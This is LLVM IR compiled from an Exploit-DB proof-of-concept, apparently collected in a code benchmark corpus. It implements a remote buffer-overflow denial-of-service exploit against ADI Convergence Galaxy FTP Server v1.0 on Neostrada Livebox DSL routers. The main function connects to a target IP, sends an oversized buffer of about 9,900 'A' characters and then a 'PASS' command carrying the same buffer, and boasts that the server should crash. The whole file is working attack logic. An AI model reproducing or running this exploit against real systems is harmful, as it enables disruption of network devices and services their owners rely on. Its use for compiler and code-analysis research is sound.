; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_5210.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_5210.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [77 x i8] c"\0A+===============================Yeah======================================+\00", align 1
@.str.1 = private unnamed_addr constant [77 x i8] c"\0A+= ADI Convergence Galaxy FTP Server v1.0 (Neostrada Livebox DSL Router) =+\00", align 1
@.str.2 = private unnamed_addr constant [42 x i8] c"\0A+= Remote Buffer Overflow DoS Exploit =+\00", align 1
@.str.3 = private unnamed_addr constant [10 x i8] c"\0A+= bY =+\00", align 1
@.str.4 = private unnamed_addr constant [68 x i8] c"\0A+= Maks M. [0in] From Dark-CodeRs Security & Programming Group! =+\00", align 1
@.str.5 = private unnamed_addr constant [38 x i8] c"\0A+= 0in(dot)email[at]gmail(dot)com =+\00", align 1
@.str.6 = private unnamed_addr constant [47 x i8] c"\0A+= Please visit: http://dark-coders.4rh.eu =+\00", align 1
@.str.7 = private unnamed_addr constant [69 x i8] c"\0A+= Greetings to: Die_Angel, Sun8hclf, M4r1usz, Aristo89, Djlinux =+\00", align 1
@.str.8 = private unnamed_addr constant [70 x i8] c"\0A+= And other friends: MaLy, Slim, elwin013, Rade0n3900, Wojto111, =+\00", align 1
@.str.9 = private unnamed_addr constant [33 x i8] c"\0A+= Chomzee, AfroPL, Joker186 =+\00", align 1
@.str.10 = private unnamed_addr constant [15 x i8] c"\0AUse %s [IP]!\0A\00", align 1
@.str.11 = private unnamed_addr constant [21 x i8] c"\0AConnecting to:%s...\00", align 1
@.str.12 = private unnamed_addr constant [7 x i8] c"\0Aeh...\00", align 1
@.str.13 = private unnamed_addr constant [14 x i8] c"\0AConnected!!\0A\00", align 1
@.str.14 = private unnamed_addr constant [5 x i8] c"\0A%s\0A\00", align 1
@.str.15 = private unnamed_addr constant [23 x i8] c"\0ASending evil buffer..\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"A\00", align 1
@.str.17 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.18 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.19 = private unnamed_addr constant [3 x i8] c"\0A\0D\00", align 1
@.str.20 = private unnamed_addr constant [52 x i8] c"\0AOK!\0AYou're Livebox FTP server should fucked out...\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca [256 x i8], align 16
  %8 = alloca [10000 x i8], align 16
  %9 = alloca i32, align 4
  %10 = alloca [100000 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str, i64 0, i64 0))
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.1, i64 0, i64 0))
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.2, i64 0, i64 0))
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0))
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.4, i64 0, i64 0))
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.5, i64 0, i64 0))
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.6, i64 0, i64 0))
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.7, i64 0, i64 0))
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.8, i64 0, i64 0))
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.9, i64 0, i64 0))
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str, i64 0, i64 0))
  %22 = load i32, i32* %4, align 4
  %23 = icmp slt i32 %22, 2
  br i1 %23, label %24, label %30

24:                                               ; preds = %2
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.10, i64 0, i64 0), i8* %27)
  %29 = call i32 @exit(i32 0) #4
  unreachable

30:                                               ; preds = %2
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 1
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.11, i64 0, i64 0), i8* %33)
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 1
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 @konekt(i8* %37)
  store i32 %38, i32* %6, align 4
  %39 = load i32, i32* %6, align 4
  %40 = icmp slt i32 %39, 0
  br i1 %40, label %41, label %44

41:                                               ; preds = %30
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.12, i64 0, i64 0))
  %43 = call i32 @exit(i32 0) #4
  unreachable

44:                                               ; preds = %30
  %45 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.13, i64 0, i64 0))
  %46 = load i32, i32* %6, align 4
  %47 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 0
  %48 = call i32 @recv(i32 %46, i8* %47, i32 255, i32 0)
  %49 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 0
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.14, i64 0, i64 0), i8* %49)
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.15, i64 0, i64 0))
  %52 = bitcast [10000 x i8]* %8 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %52, i8 0, i64 10000, i1 false)
  %53 = bitcast i8* %52 to [10000 x i8]*
  %54 = getelementptr inbounds [10000 x i8], [10000 x i8]* %53, i32 0, i32 0
  store i8 37, i8* %54, align 16
  %55 = getelementptr inbounds [10000 x i8], [10000 x i8]* %53, i32 0, i32 1
  store i8 110, i8* %55, align 1
  %56 = getelementptr inbounds [10000 x i8], [10000 x i8]* %53, i32 0, i32 2
  store i8 1, i8* %56, align 2
  %57 = getelementptr inbounds [10000 x i8], [10000 x i8]* %53, i32 0, i32 3
  store i8 2, i8* %57, align 1
  %58 = getelementptr inbounds [10000 x i8], [10000 x i8]* %53, i32 0, i32 4
  store i8 3, i8* %58, align 4
  %59 = getelementptr inbounds [10000 x i8], [10000 x i8]* %53, i32 0, i32 5
  store i8 4, i8* %59, align 1
  store i32 0, i32* %9, align 4
  br label %60

60:                                               ; preds = %66, %44
  %61 = load i32, i32* %9, align 4
  %62 = icmp slt i32 %61, 9900
  br i1 %62, label %63, label %69

63:                                               ; preds = %60
  %64 = getelementptr inbounds [10000 x i8], [10000 x i8]* %8, i64 0, i64 0
  %65 = call i32 @strcat(i8* %64, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i64 0, i64 0))
  br label %66

66:                                               ; preds = %63
  %67 = load i32, i32* %9, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %9, align 4
  br label %60

69:                                               ; preds = %60
  %70 = getelementptr inbounds [10000 x i8], [10000 x i8]* %8, i64 0, i64 0
  %71 = call i32 @strcat(i8* %70, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.17, i64 0, i64 0))
  %72 = load i32, i32* %6, align 4
  %73 = getelementptr inbounds [10000 x i8], [10000 x i8]* %8, i64 0, i64 0
  %74 = getelementptr inbounds [10000 x i8], [10000 x i8]* %8, i64 0, i64 0
  %75 = call i32 @strlen(i8* %74)
  %76 = call i32 @send(i32 %72, i8* %73, i32 %75, i32 0)
  %77 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 0
  %78 = call i32 @strcpy(i8* %77, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.18, i64 0, i64 0))
  %79 = load i32, i32* %6, align 4
  %80 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 0
  %81 = call i32 @recv(i32 %79, i8* %80, i32 255, i32 0)
  %82 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 0
  %83 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.14, i64 0, i64 0), i8* %82)
  %84 = bitcast [100000 x i8]* %10 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %84, i8 0, i64 100000, i1 false)
  %85 = bitcast i8* %84 to [100000 x i8]*
  %86 = getelementptr inbounds [100000 x i8], [100000 x i8]* %85, i32 0, i32 0
  store i8 80, i8* %86, align 16
  %87 = getelementptr inbounds [100000 x i8], [100000 x i8]* %85, i32 0, i32 1
  store i8 65, i8* %87, align 1
  %88 = getelementptr inbounds [100000 x i8], [100000 x i8]* %85, i32 0, i32 2
  store i8 83, i8* %88, align 2
  %89 = getelementptr inbounds [100000 x i8], [100000 x i8]* %85, i32 0, i32 3
  store i8 83, i8* %89, align 1
  %90 = getelementptr inbounds [100000 x i8], [100000 x i8]* %85, i32 0, i32 4
  store i8 32, i8* %90, align 4
  %91 = getelementptr inbounds [100000 x i8], [100000 x i8]* %10, i64 0, i64 0
  %92 = getelementptr inbounds [10000 x i8], [10000 x i8]* %8, i64 0, i64 0
  %93 = call i32 @strcat(i8* %91, i8* %92)
  %94 = getelementptr inbounds [100000 x i8], [100000 x i8]* %10, i64 0, i64 0
  %95 = call i32 @strcat(i8* %94, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.19, i64 0, i64 0))
  %96 = load i32, i32* %6, align 4
  %97 = getelementptr inbounds [100000 x i8], [100000 x i8]* %10, i64 0, i64 0
  %98 = getelementptr inbounds [100000 x i8], [100000 x i8]* %10, i64 0, i64 0
  %99 = call i32 @strlen(i8* %98)
  %100 = call i32 @send(i32 %96, i8* %97, i32 %99, i32 0)
  %101 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 0
  %102 = call i32 @strcpy(i8* %101, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.18, i64 0, i64 0))
  %103 = load i32, i32* %6, align 4
  %104 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 0
  %105 = call i32 @recv(i32 %103, i8* %104, i32 255, i32 0)
  %106 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 0
  %107 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.14, i64 0, i64 0), i8* %106)
  %108 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.20, i64 0, i64 0))
  %109 = call i32 @exit(i32 0) #4
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @konekt(i8*) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #3

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
